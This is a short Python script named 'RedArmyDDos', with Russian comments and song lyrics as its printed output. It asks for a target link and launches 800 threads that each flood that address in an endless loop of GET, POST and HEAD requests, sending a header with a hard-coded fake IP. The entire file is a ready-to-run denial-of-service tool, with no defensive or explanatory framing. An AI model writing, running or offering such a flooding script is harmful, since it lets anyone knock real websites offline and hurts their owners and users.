import requests
from threading import Thread
import random

#настройки
FakeIp = '92.223.109.96'

user = [FakeIp]

headers = {'0': random.choice(user)}

#работа
print('RedArmyDDos')
adres = str(input('link:'))
def send():
	while True:
		requests.get(adres, headers=headers)
		print('Белая армия чёрный народ!')
		requests.post(adres, headers=headers)
		print('Снова готовят нам царский трон!')
		requests.head(adres, headers=headers)
		print('От тайги до британских морей!')
		print('Красная армия всех сильней!')

if __name__ == '__main__':
	for i in range(800):
		thr = Thread(target=send)
		thr.start()